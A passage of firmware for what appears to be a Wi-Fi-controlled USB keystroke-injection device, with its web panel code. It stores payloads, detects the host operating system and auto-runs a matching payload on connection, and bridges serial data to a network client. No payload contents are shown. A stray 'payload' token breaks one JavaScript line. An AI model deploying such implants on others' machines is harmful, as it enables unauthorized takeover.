(controlserver.arg(\"configmodule\")) {\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n    controlserver.send(200, \"text/plain\", \"Payload running...\");\n  });\n\n  controlserver.on(\"/runlivestartup\", []() {\n    String payload_startup = controlserver.arg(\"livepayload\");\n    String fileName = \"payload-startup.txt\";\n    String filePath = \"/payloads/\" + fileName;\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n\n    fsUploadFile.print(payload_startup);\n    fsUploadFile.close();\n\n    // Set layout based on payload content if specified\n    setLayoutFromPayload(payload_startup);\n\n    payloadExecuted = true;\n    controlserver.send(200, \"text/plain\", \"Payload saved\");\n  });\n\n  controlserver.on(\"/runlivesave\", HTTP_POST, []() {\n    String payload_save = controlserver.arg(\"livepayload\");\n    String payloadName = controlserver.arg(\"payloadName\");\n    String payloadDesc = controlserver.arg(\"payloadDescription\");\n    String payloadOS = controlserver.arg(\"payloadOS\");\n    String fileName;\n\n    // Set layout based on payload content if specified\n    setLayoutFromPayload(payload_save);\n\n    int namePos = payload_save.indexOf(\"# Name: \");\n    if (namePos != -1) {\n      int start = namePos + 8;\n      int end = payload_save.indexOf('\\n', start);\n      if (end == -1) {\n        end = payload_save.length();\n      }\n      fileName = payload_save.substring(start, end);\n      fileName.trim();\n    }\n\n    if (fileName.length() == 0 || fileName.indexOf('/') != -1) {\n      const char charset[] = \"abcdefghijklmnopqrstuvwxyz1234567890\";\n      fileName = \"livepayload-\";\n      for (int i = 0; i < 8; i++) {\n        fileName += charset[random(0, 26)];\n      }\n      fileName += \".txt\";\n    }\n\n    String filePath = \"/payloads/\" + fileName;\n\n    if (!LittleFS.exists(\"/payloads\")) {\n      LittleFS.mkdir(\"/payloads\");\n    }\n\n    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n    fsUploadFile.print(payload_save);\n    fsUploadFile.close();\n\n    // Save metadata\n    savePayloadMetadata(filePath, payloadName, payloadDesc, payloadOS);\n\n    payloadExecuted = true;\n    controlserver.send(200, \"text/plain\", \"Payload saved\");\n  });\n\n  controlserver.on(\"/payloadstatuspayload\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/payloadstatusstartup\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/payloadstatussave\", []() {\n    if (payloadExecuted) {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"executed\\\"}\");\n      payloadExecuted = false;\n    } else {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\": \\\"pending\\\"}\");\n    }\n  });\n\n  controlserver.on(\"/autoexecplanning\", []() {\n    controlserver.send_P(200, \"text/html\", AutoExecPlanning);\n  });\n\n  controlserver.on(\"/listpayloadsdata\", []() {\n    DynamicJsonDocument doc(4096);\n    JsonArray payloads = doc.to<JsonArray>();\n\n    File root = LittleFS.open(\"/payloads/\");\n    if (root && root.isDirectory()) {\n      File file = root.openNextFile();\n      while (file) {\n        String fileName = file.name();\n        if (!fileName.endsWith(\".meta\")) {\n          String filePath = \"/payloads/\" + fileName;\n          String payloadName = readPayloadMetadata(filePath, META_NAME);\n          String payloadDesc = readPayloadMetadata(filePath, META_DESCRIPTION);\n\n          JsonObject payload = payloads.createNestedObject();\n          payload[\"path\"] = filePath;\n          payload[\"name\"] = payloadName;\n          payload[\"description\"] = payloadDesc;\n          payload[\"filename\"] = fileName;\n        }\n        file = root.openNextFile();\n      }\n    }\n\n    String output;\n    serializeJson(doc, output);\n    controlserver.send(200, \"application/json\", output);\n  });\n\n  controlserver.on(\"/saveautoexecplan\", HTTP_POST, []() {\n    String payload = controlserver.arg(\"plain\");\n    DynamicJsonDocument doc(2048);\n    deserializeJson(doc, payload);\n\n    File file = LittleFS.open(\"/autoexec_plan.json\", FILE_WRITE);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{\\\"success\\\":false}\");\n      return;\n    }\n\n    serializeJson(doc, file);\n    file.close();\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true}\");\n  });\n\n  controlserver.on(\"/getautoexecplan\", []() {\n    if (!LittleFS.exists(\"/autoexec_plan.json\")) {\n      controlserver.send(200, \"application/json\", \"{}\");\n      return;\n    }\n\n    File file = LittleFS.open(\"/autoexec_plan.json\", FILE_READ);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{}\");\n      return;\n    }\n\n    String content = file.readString();\n    file.close();\n    controlserver.send(200, \"application/json\", content);\n  });\n\n  controlserver.on(\"/clearautoexecplan\", HTTP_POST, []() {\n    if (LittleFS.exists(\"/autoexec_plan.json\")) {\n      LittleFS.remove(\"/autoexec_plan.json\");\n    }\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true}\");\n  });\n\n  controlserver.on(\"/updatepayload\", HTTP_POST, []() {\n    if (controlserver.hasArg(\"plain\")) {  // Check for JSON data\n      String payload = controlserver.arg(\"plain\");\n      DynamicJsonDocument doc(2048);\n      deserializeJson(doc, payload);\n\n      String path = doc[\"path\"].as<String>();\n      String content = doc[\"content\"].as<String>();\n\n      if (path.length() > 0 && content.length() > 0) {\n        File file = LittleFS.open(path, FILE_WRITE);\n        if (!file) {\n          controlserver.send(500, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to open file for writing\\\"}\");\n          return;\n        }\n\n        file.print(content);\n        file.close();\n\n        // Update layout if specified in payload\n        setLayoutFromPayload(content);\n\n        controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Payload updated successfully\\\"}\");\n      } else {\n        controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Missing path or content parameters\\\"}\");\n      }\n    } else {\n      controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"No data received\\\"}\");\n    }\n  });\n\n\n  controlserver.on(\"/updatewifi\", HTTP_POST, handleUpdateWiFi);\n  controlserver.on(\"/layout\", HTTP_POST, handleLayout);\n  controlserver.on(\"/deletewificonfig\", HTTP_POST, handleDeleteWiFiConfig);\n  controlserver.on(\"/updateusb\", HTTP_POST, handleUpdateUSB);\n  controlserver.on(\"/deleteusbconfig\", HTTP_POST, handleDeleteUSBConfig);\n  controlserver.on(\"/deletepayload\", HTTP_POST, handleDeletePayload);\n  controlserver.on(\"/getcurrentlayout\", handleGetCurrentLayout);\n  controlserver.on(\"/updatehostname\", HTTP_POST, handleUpdateHostname);\n  controlserver.on(\"/gethostname\", handleGetHostname);\n  controlserver.on(\"/updatebackupwifi\", HTTP_POST, handleUpdateBackupWiFi);\n  controlserver.on(\"/deletebackupwificonfig\", HTTP_POST, handleDeleteBackupWiFiConfig);\n  controlserver.on(\"/updatepayload\", HTTP_POST, handleUpdatePayload);\n\n  httpUpdater.setup(&controlserver);\n  controlserver.begin();\n}\n\nvoid loop() {\n  controlserver.handleClient();\n  delay(10);\n  vTaskDelay(1);\n\n  // Check if we should auto-execute a payload\n  static bool autoExecChecked = false;\n  static unsigned long osDetectionStartTime = 0;\n  static bool osDetectionInProgress = false;\n  static DynamicJsonDocument pendingAutoExecPlan(2048);\n  static bool hasPendingPlan = false;\n  static bool firstRun = true;\n\n  // Only check once per boot\n  if (firstRun) {\n    firstRun = false;\n    \n    if (LittleFS.exists(\"/autoexec_plan.json\")) {\n      File file = LittleFS.open(\"/autoexec_plan.json\", FILE_READ);\n      if (file) {\n        String content = file.readString();\n        file.close();\n        deserializeJson(pendingAutoExecPlan, content);\n\n        if (pendingAutoExecPlan[\"enabled\"] == true) {\n          // Check if we have a no-detection payload\n          if (pendingAutoExecPlan[\"nodetection\"]) {\n            String osPayloadPath = pendingAutoExecPlan[\"nodetection\"][\"path\"].as<String>();\n            if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {\n              readFile(LittleFS, osPayloadPath);\n              payload_state = 1;\n              payloadExecuted = false;\n              autoExecChecked = true;\n            }\n          } else {\n            // If no no-detection payload, proceed with OS detection\n            onDetectOSRequested();\n            osDetectionStartTime = millis();\n            osDetectionInProgress = true;\n            hasPendingPlan = true;\n            autoExecChecked = true;\n          }\n        }\n      }\n    }\n  }\n\n  // Handle OS detection completion\n  if (osDetectionInProgress) {\n    if (os_detection_complete) {\n      // Detection complete, execute payload if available\n      if (hasPendingPlan) {\n        String osPayloadPath = \"\";\n\n        switch (detected_os) {\n          case OS_WINDOWS:\n            osPayloadPath = pendingAutoExecPlan[\"windows\"][\"path\"].as<String>();\n            break;\n          case OS_LINUX:\n            osPayloadPath = pendingAutoExecPlan[\"linux\"][\"path\"].as<String>();\n            break;\n          case OS_IOS:\n            osPayloadPath = pendingAutoExecPlan[\"ios\"][\"path\"].as<String>();\n            break;\n          case OS_MACOS:\n            osPayloadPath = pendingAutoExecPlan[\"macos\"][\"path\"].as<String>();\n            break;\n          case OS_ANDROID:\n            osPayloadPath = pendingAutoExecPlan[\"android\"][\"path\"].as<String>();\n            break;\n          default:\n            break;\n        }\n\n        if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {\n          readFile(LittleFS, osPayloadPath);\n          payload_state = 1;\n          payloadExecuted = false;\n        }\n      }\n      osDetectionInProgress = false;\n      hasPendingPlan = false;\n    } else if (millis() - osDetectionStartTime > 30000) {\n      // Timeout after 30 seconds if detection fails\n      os = \"OS Unknown\";\n      os_detection_complete = true;\n      osDetectionInProgress = false;\n      hasPendingPlan = false;\n    }\n  }\n\n  while (USBSerial.available()) {\n    String data = USBSerial.readString();\n    clientServer.print(data);\n  }\n  while (clientServer.available()) {\n    String data = clientServer.readString();\n    USBSerial.print(data);\n  }\n  if (payload_state == 1) {\n    // Set layout before executing payload\n    setLayoutFromPayload(livepayload);\n\n    char *splitlines;\n    int payloadlen = livepayload.length() + 1;\n    char request[payloadlen];\n    livepayload.toCharArray(request, payloadlen);\n    splitlines = strtok(request, \"\\r\\n\");\n    while (splitlines != NULL) {\n      cmd = splitlines;\n      payloadExec();\n      splitlines = strtok(NULL, \"\\r\\n\");\n      vTaskDelay(1);\n    }\n    payload_state = 0;\n    cmd = \"\";\n    livepayload = \"\";\n    payloadExecuted = true;\n  }\n\n  // WiFi connection monitoring\n  if (millis() - lastWifiCheckTime >= wifiCheckInterval) {\n    lastWifiCheckTime = millis();\n    \n    // Only attempt reconnection if we're not currently connected\n    if (WiFi.status() != WL_CONNECTED) {\n      connectToWiFi();\n    }\n  }\n  vTaskDelay(1);\n}\n\nGroup: javascript\nContent:\nconst char Redirect[] PROGMEM = R\"=====(\n\n// Track navigation state and abort controller globally\nlet isNavigating = false;\nlet connectionController = null;\nlet navigationTimeout = null;\n\nfunction checkConnection() {\n    if (isNavigating) {\n        if (connectionController) {\n            connectionController.abort();\n        }\n        return;\n    }\n\n    // Abort any existing connection check\n    if (connectionController) {\n        connectionController.abort();\n    }\n\n    connectionController = new AbortController();\n    const timeoutId = setTimeout(() => connectionController.abort(), 1000);\n\n    // Check if we're on the homepage\n    const isHomePage = window.location.pathname === '/' || window.location.pathname === '/index.html';\n\n    fetch(isHomePage ? '/stats' : '/connectioncheck', { \n        signal: connectionController.signal \n    })\n    .then(response => {\n        clearTimeout(timeoutId);\n        if (isNavigating) return;\n\n        if (isHomePage) {\n            return response.json().then(data => {\n                updateStats(data);\n            });\n        } else {\n            updateConnectionStatus(response.ok);\n            return response.json();\n        }\n    })\n    .catch(error => {\n        clearTimeout(timeoutId);\n        if (error.name !== 'AbortError' && !isNavigating) {\n            updateConnectionStatus(false);\n            if (isHomePage) {\n                // Set default values when offline\n                document.getElementById('uptime').innerText = 'N/A';\n                document.getElementById('cpu0').innerText = 'N/A';\n                document.getElementById('cpu1').innerText = 'N/A';\n                document.getElementById('temperature').innerText = 'N/A';\n                document.getElementById('freespiffs').innerText = 'N/A';\n                document.getElementById('totalram').innerText = 'N/A';\n                document.getElementById('freeram').innerText = 'N/A';\n                document.getElementById('targetos').innerText = 'N/A';\n                document.getElementById('ssid').innerText = 'N/A';\n                document.getElementById('ipaddress').innerText = 'N/A';\n            }\n        }\n    });\n}\n\nfunction updateConnectionStatus(isOnline) {\n    document.querySelectorAll('.status-indicator').forEach(indicator => {\n        indicator.classList.toggle('status-online', isOnline);\n        indicator.classList.toggle('status-offline', !isOnline);\n    });\n\n    if (window.location.pathname !== '/') {\n        document.querySelectorAll('.cable-wind-logo').forEach(title => {\n            title.classList.toggle('online', isOnline);\n            title.classList.toggle('offline', !isOnline);\n        });\n    }\n}\n\nfunction updateStats(data) {\n    // Update all stats that exist in index.h\n    if (data.uptime) document.getElementById('uptime').innerText = data.uptime + ' seconds';\n    if (data.cpu0) document.getElementById('cpu0').innerText = data.cpu0 + ' MHz';\n    if (data.cpu1) document.getElementById('cpu1').innerText = data.cpu1 + ' MHz';\n    if (data.temperature) document.getElementById('temperature').innerText = data.temperature.toFixed(1) + ' \ufffd\ufffdC';\n    if (data.freespiffs) document.getElementById('freespiffs').innerText = formatBytes(data.freespiffs);\n    if (data.totalram) document.getElementById('totalram').innerText = formatBytes(data.totalram);\n    if (data.freeram) document.getElementById('freeram').innerText = formatBytes(data.freeram);\n    if (data.os) document.getElementById('targetos').innerText = data.os;\n    if (data.ssid) document.getElementById('ssid').innerText = data.ssid;\n    if (data.ipaddress) document.getElementById('ipaddress').innerText = data.ipaddress;\n\n    // Update connection status indicator\n    updateConnectionStatus(true);\n}\n\n// Format bytes helper function\nfunction formatBytes(bytes) {\n    if (bytes === 0) return '0 Bytes';\n    const k = 1024;\n    const sizes = ['Bytes', 'KB', 'MB', 'GB'];\n    const i = Math.floor(Math.log(bytes) / Math.log(k));\n    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];\n}\n\nsetInterval(checkConnection, 5000);\ncheckConnection();\n\nfunction togglePayload(action) {\n    var checkbox = document.getElementById('toggle' + action);\n    var message = document.getElementById('message' + action);\n\n    if (checkbox.checked) {\n        var form = document.getElementById('config');\n        var formData = new FormData(form);\n\n        fetch('/runlive' + action.toLowerCase(), {\n            method: 'POST',\n            body: formData,\n            mode: 'cors'\n        })\n        .then(response => response.text())\n        .then(data => {\n            pollPayloadStatus(action);\n        })\n        .catch(error => {\n            console.error('Error:', error);\n        });\n    } else {\n        message.innerText = '';\n    }\n}\n\nfunction pollPayloadStatus(action) {\n    var checkbox = document.getElementById('toggle' + action);\n    var message = document.getElementById('message' + action);\n\n    fetch('/payloadstatus' + action.toLowerCase())\n    .then(response => response.json())\n    .then(data => {\n        console.log('Polling result:', data);\n\n        if (data.status === 'executed') {\n            checkbox.checked = false;\n            message.innerText = 'The action has been executed successfully';\n        } else {\n            setTimeout(function() { pollPayloadStatus(action); }, 1000);\n        }\n    })\n    .catch(error => {\n        console.error('Error:', error);\n    });\n}\n\nfunction handleSubmit(event) {\n    event.preventDefault();\n\n    const formData = new FormData(document.getElementById('uploadForm'));\n    const uploadMessage = document.getElementById('uploadMessageContainer');\n\n    fetch('/upload', {\n        method: 'POST',\n        body: formData\n    })\n    .then(response => response.json())\n    .then(data => {\n        if (data.status === 'success') {\n            showMessage('success', data.message);\n            document.getElementById('uploadForm').reset();\n        } else {\n            showMessage('error', data.message);\n        }\n    })\n    .catch(error => {\n        showMessage('error', 'Error uploading file');\n        console.error('Error:', error);\n    });\n}\n\nfunction showMessage(type, text) {\n    const container = document.getElementById('global-toast') || document.createElement('div');\n    if (!container.id) {\n        container.id = 'global-toast';\n        container.className = 'toast-container';\n        document.body.appendChild(container);\n    }\n    \n    const toast = document.createElement('div');\n    toast.className = `toast-message ${type}`;\n    \n    const messageSpan = document.createElement('span');\n    messageSpan.textContent = text;\n    \n    const closeButton = document.createElement('span');\n    closeButton.className = 'toast-close';\n    closeButton.innerHTML = '&times;';\n    closeButton.onclick = () => {\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';\n        setTimeout(() => toast.remove(), 300);\n    };\n    \n    toast.appendChild(messageSpan);\n    toast.appendChild(closeButton);\n    container.appendChild(toast);\n    \n    const timer = setTimeout(() => {\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';\n        setTimeout(() => toast.remove(), 300);\n    }, 5000);\n    \n    closeButton.onclick = () => {\n        clearTimeout(timer);\n        toast.style.animation = 'toastFadeOut 0.3s ease-out';payload\n        \n        setTimeout(() => toast.remove(), 300);\n    };\n}\n\n// Prevent double-tap zoom on iOS\ndocument.addEventListener('touchstart', function(event) {\n    if (event.touches.length > 1) {\n        event.preventDefault();\n    }\n}, { passive: false });\n\ndocument.addEventListener('gesturestart', function(e) {\n    e.preventDefault();\n});\n\ndocument.addEventListener(\"DOMContentLoaded\", function () {\n    const links = document.querySelectorAll(\"#menu a\");\n\n    links.forEach(link => {\n        link.addEventListener('click', function(e) {\n            if (this.classList.contains('active')) {\n                e.preventDefault();\n                return;\n            }\n\n            // Clear any pending navigation timeout\n            if (navigationTimeout) {\n                clearTimeout(navigationTimeout);\n            }\n\n            // Set navigation flag and abort any ongoing connection check\n            isNavigating = true;\n            if (connectionController) {\n                connectionController.abort();\n            }\n\n            // Add loading class to body\n            document.body.classList.add('page-loading');\n\n            // Set a timeout to ensure navigation happens even if something hangs\n            navigationTimeout = setTimeout(() => {\n                window.location.href = this.href;\n            }, 100); // Reduced from 300ms to 100ms\n\n            // For iOS, prevent default and use location.href after a small delay\n            if (/iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream) {\n                e.preventDefault();\n                setTimeout(() => {\n                    window.location.href = this.href;\n                }, 50);\n            }\n        });\n    });\n    // Reset navigation flag when page loads\n    isNavigating = false;\n    document.body.classList.remove('page-loading');\n\n    // --- OS-based payload filter ---\n    const select = document.getElementById(\"os-filter\");\n    if (select) {\n        function filterPayloads(os) {\n            const payloads = document.querySelectorAll(\".payload-item\");\n            payloads.forEach(el => {\n                const itemOS = el.getAttribute(\"data-os\") || \"all\";\n                el.style.display = (os === \"all\" || itemOS === os) ? \"\" : \"none\";\n            });\n        }\n    \n        // Defer localStorage access to prevent blocking\n        setTimeout(() => {\n            // Load saved filter option from localStorage\n            const savedOS = localStorage.getItem(\"selectedOS\") || \"all\";\n            select.value = savedOS;\n            filterPayloads(savedOS);\n        }, 0);\n    \n        // Save new selection and re-filter\n        select.addEventListener(\"change\", function() {\n            // Use requestIdleCallback for non-urgent updates\n            requestIdleCallback(() => {\n                const selected = this.value.toLowerCase();\n                localStorage.setItem(\"selectedOS\", selected);\n                filterPayloads(selected);\n            }, { timeout: 200 }); // Fallback if idle takes too long\n        });\n    }\n});\n)=====\";\n\nGroup: style\nContent:\nconst char Style[] PROGMEM = R\"=====(\n:root {\n  --primary: #00f2ff;\n  --secondary: #00ff88;\n  --accent: #ff00aa;\n  --dark: #0a0a12;\n  --darker: #050508;\n  --light: #f0f0ff; /* Changed from #e0e0ff */\n  --success: #00ff88;\n  --error: #ff0033;\n  --warning: #ffaa00;\n}\n\nbody {\n  background-color: #000000; /* Pure black */\n  color: var(--light);\n  font-family: 'Courier New', monospace;\n  margin: 0;\n  padding: 0;\n  overflow-x: hidden;\n  line-height: 1.6;\n}\n\n/* Header/Navigation - Mobile First */\n#menu {\n  background: var(--darker);\n  border-bottom: 1px solid var(--primary);\n  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);\n  padding: 10px 0;\n  position: relative; /* Changed from sticky to relative */\n  top: auto; /* Remove sticky positioning */\n  z-index: 100;\n}\n\n#menu ul {\n  display: none;\n  flex-direction: column;\n  padding: 0;\n  margin: 0;\n  list-style: none;\n  width: 100%;\n}\n\n#menu li {\n  margin: 5px 0;\n  position: relative;\n}\n\n#menu a {\n  color: var(--light);\n  text-decoration: none;\n  padding: 10px 15px;\n  display: block;\n  transition: all 0.3s;\n  position: relative;\n  touch-action: manipulation; /* Disable double-tap zoom */\n}\n\n#menu a:hover {\n  color: var(--primary);\n  background: rgba(0, 242, 255, 0.1);\n  will-change: width; \n}\n\n#menu a::after {\n  content: '';\n  position: absolute;\n  bottom: 0;\n  left: 50%;\n  transform: translateX(-50%);\n  width: 0;\n  height: 2px;\n  background: var(--primary);\n  transition: width 0.3s;\n}\n\n#menu a:hover::after {\n  width: 70%;\n}\n\n#menu .usb-icon {\n  vertical-align: middle;\n  margin-right: 5px;\n}\n\n/* Active menu item */\n#menu a.active {\n  color: var(--primary);\n  font-weight: bold;\n}\n\n#menu a.active::after {\n  width: 70%;\n}\n\n/* Hamburger menu - Mobile - Left side */\n#responsive-menu + label {\n  display: block;\n  cursor: pointer;\n  padding: 5px 15px;\n  position: absolute;\n  top: 0;\n  left: 0;\n  z-index: 101;\n  background: var(--darker); /* Add background to match menu */\n}\n\n#responsive-menu + label::before {\n  content: \"\ufffd\ufffd\ufffd\";\n  font-size: 1.5em;\n  color: var(--primary);\n}\n\n#responsive-menu:checked + label::before {\n  content: \"\ufffd\ufffd\ufffd\";\n}\n\n#responsive-menu:checked ~ ul {\n  display: flex;\n  flex-direction: column;\n  align-items: center; /* Center menu items */\n  text-align: center; /* Center text */\n  padding-top: 60px; /* Make space for hamburger */\n}\n\n/* Adjust menu items for centered layout */\n#responsive-menu:checked ~ ul li {\n  width: 100%;\n  text-align: center;\n}\n\n#responsive-menu:checked ~ ul a {\n  justify-content: center;\n}\n\n/* Main content */\n.view-container {\n  background: rgba(10, 10, 18, 0.8);\n  border: 1px solid var(--primary);\n  border-radius: 5px;\n  padding: 15px;\n  margin-top: 20px;\n  margin: 15px auto;\n  max-width: 900px;\n  box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);\n  position: relative;\n  overflow: hidden;\n}\n\n.view-container::before {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 100%;\n  height: 3px;\n  background: linear-gradient(90deg, var(--primary), var(--secondary));\n}\n\n/* Buttons */\nbutton, input[type=\"submit\"], input[type=\"button\"] {\n  background: linear-gradient(135deg, var(--primary), var(--secondary));\n  color: var(--darker);\n  border: none;\n  padding: 5px 5px;\n  font-weight: bold;\n  border-radius: 3px;\n  cursor: pointer;\n  transition: all 0.3s;\n  text-transform: uppercase;\n  letter-spacing: 1px;\n  position: relative;\n  overflow: hidden;\n  font-family: 'Courier New', monospace;\n  font-size: 12px;\n  margin: 5px;\n  min-height: 44px;\n}\n\nbutton:hover, input[type=\"submit\"]:hover, input[type=\"button\"]:hover {\n  transform: translateY(-2px);\n  box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4);\n}\n\nbutton::after {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: -100%;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);\n  transition: 0.5s;\n}\n\nbutton:hover::after {\n  left: 100%;\n}\n\nbutton[name=\"deleteWifiButton\"], \nbutton[name=\"deleteUSBButton\"],\nbutton[name=\"deleteBackupWifiButton\"],\nbutton[name=\"clearCacheButton\"] {\n  background: linear-gradient(135deg, var(--error), #cc0022);\n}\n\n/* Input fields - Improved for mobile */\n/* Form inputs - one line height */\ninput:not([type=\"checkbox\"]):not([type=\"file\"]),\nselect {\n  height: 36px; /* Fixed height for single-line inputs */\n  padding: 8px 12px;\n  line-height: 1.2;\n}\n\ntextarea {\n  min-height: 100px; /* Keep textareas taller */\n  resize: none;\n}\n\n* {\n  -webkit-tap-highlight-color: transparent;\n}\n\n.single-line-input {\n  height: 36px !important;\n  line-height: 36px !important;\n  padding: 0 12px !important;\n}\n\ninput, textarea, select {\n  background: rgba(0, 0, 0, 0.3);\n  border: 1px solid var(--primary);\n  color: var(--light);\n  padding: 8px 12px;\n  border-radius: 3px;\n  width: 100%;\n  margin-bottom: 12px;\n  font-family: 'Courier New', monospace;\n  transition: all 0.3s;\n  box-sizing: border-box;\n  font-size: 16px !important;\n}\n\ninput:focus, textarea:focus, select:focus {\n  outline: none;\n  border-color: var(--secondary);\n  box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);\n}*/\n\ninput[type=\"checkbox\"] {\n  width: auto;\n  margin-right: 10px;\n}\n\n/* Form groups - Improved spacing */\n.form-group {\n  margin-bottom: 15px;\n}\n\n.form-group label {\n  display: block;\n  margin-top: 10px;\n  margin-bottom: 6px;\n  color: var(--primary);\n  font-weight: bold;\n  font-size: 1em;\n}\n\n/* Validation styles */\n#validationStatus {\n  display: block;\n  font-size: 0.85em;\n  white-space: pre-wrap;\n  font-family: 'Courier New', monospace;\n  background-color: rgba(10, 10, 10, 0.9);\n  padding: 8px;\n  border-radius: 3px;\n  border-left: 3px solid var(--error);\n  margin-top: 5px;\n}\n\n.validation-ok {\n  color: var(--success);\n  border-left-color: var(--success) !important;\n}\n\n.validation-error {\n  color: var(--error);\n}\n\n.validation-empty {\n    color: #666; /* Gray color for empty state */\n    font-style: italic;\n    display: block; /* Ensure it's visible */\n}\n\n/* Desktop specific styles */\n@media (min-width: 768px) {\n  #validationStatus {\n    padding-left: 30px;\n    text-indent: -20px;\n    line-height: 1.4;\n  }\n  \n  #validationStatus::before {\n    content: \"\ufffd\ufffd\ufffd \";\n    color: var(--primary);\n    margin-right: 5px;\n  }\n}\n\n/* Mobile specific styles */\n@media (max-width: 767px) {\n  #validationStatus {\n    padding-left: 15px;\n  }\n}\n\n/* Payload list */\n.payload-list-container {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));\n  gap: 12px;\n  margin: 15px 0;\n}\n\n.payload-item {\n    border: 1px solid var(--primary);\n    border-radius: 3px;\n    padding: 12px;\n    margin-bottom: 12px;\n    background-color: rgba(10, 10, 10, 0.9);\n}\n\n.payload-desc {\n    color: #aaa;\n    font-size: 0.85em;\n    margin: 8px 0;\n    line-height: 1.4;\n    max-height: 2.8em; /* 2 lines */\n    overflow: hidden;\n    text-overflow: ellipsis;\n    display: -webkit-box;\n    -webkit-line-clamp: 2;\n    -webkit-box-orient: vertical;\n    white-space: pre-line;\n}\n\n.payload-filename {\n    color: #666;\n    font-size: 0.75em;\n    font-family: monospace;\n}\n\n.payload-item, .payload-item-os {\n  border: 1px solid var(--primary);\n  border-radius: 3px;\n  padding: 12px;\n  transition: all 0.3s;\n  position: relative;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n.payload-item:hover, .payload-item-os:hover {\n  transform: translateY(-5px);\n  box-shadow: 0 10px 20px rgba(0, 242, 255, 0.2);\n  border-color: var(--secondary);\n}\n\n.payload-item::before, .payload-item-os::before {\n  content: \"\";\n  position: absolute;\n  top: 0;\n  left: 0;\n  width: 3px;\n  height: 100%;\n  background: linear-gradient(to bottom, var(--primary), var(--secondary));\n}\n\n.payload-description-content {\n    padding: 0 15px;\n    text-align: left;\n    font-size: 0.9em;\n    line-height: 1.5;\n    margin: 0;\n    text-indent: 0;\n    white-space: pre-line;\n}\n\n.payload-description-content p:first-child,\n.payload-description-content div:first-child {\n    margin-top: 0;\n    text-indent: 0;\n}\n\n.payload-description-header {\n    text-align: center;\n    padding: 12px;\n    cursor: pointer;\n    background: rgba(5, 5, 8, 0.7);\n    border-bottom: 1px solid var(--primary);\n}\n\n/* Payload Description Styles */\n.payload-description-container {\n    border: 1px solid var(--primary);\n    border-radius: 5px;\n    margin: 15px 0;\n    overflow: hidden;\n    background: rgba(10, 10, 18, 0.8);\n}\n\n.payload-description-header {\n    padding: 12px 15px;\n    cursor: pointer;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    color: var(--primary);\n    font-weight: bold;\n    transition: all 0.3s;\n    background: rgba(5, 5, 8, 0.7);\n}\n\n.payload-description-header:hover {\n    background: rgba(0, 242, 255, 0.1);\n}\n\n.payload-description-content.expanded {\n    max-height: 500px;\n    overflow-y: auto;\n    white-space: pre-line;\n}\n\n.toggle-icon {\n    font-size: 0.8em;\n    transition: transform 0.3s;\n    margin-left: 10px;\n}\n\n.payload-filename {\n  color: #666;\n  font-size: 11px;\n  font-family: monospace;\n}\n\n/* Terminal style elements */\n.terminal-style, .payload-container pre, textarea.payload-input {\n  border: 1px solid var(--primary);\n  color: var(--secondary);\n  padding: 12px;\n  border-radius: 3px;\n  font-family: 'Courier New', monospace;\n  position: relative;\n  width: 100%;\n  overflow: auto;\n  max-height: 80vh;\n  height: 20em;\n  resize: vertical;\n  white-space: pre-wrap;\n  word-wrap: break-word;\n  box-sizing: border-box;\n  background-color: rgba(10, 10, 10, 0.9); /* Darker than before */\n}\n\n/* Toast notifications - Centered below menu */\n.toast-container {\n  position: fixed;\n  top: 80px; /* Below the menu */\n  left: 0;\n  right: 0;\n  z-index: 1000;\n  width: 90%;\n  max-width: 400px;\n  margin: 0 auto;\n  text-align: center;\n}\n\n.toast-message {\n  position: relative;\n  padding: 15px 20px;\n  margin-bottom: 10px;\n  border-radius: 4px;\n  color: white;\n  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);\n  animation: toastSlideDown 0.3s ease-out;\n  pointer-events: auto;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  background-color: var(--darker);\n  border-top: 3px solid; /* Changed from border-left to border-top */\n}\n\n@keyframes toastSlideDown 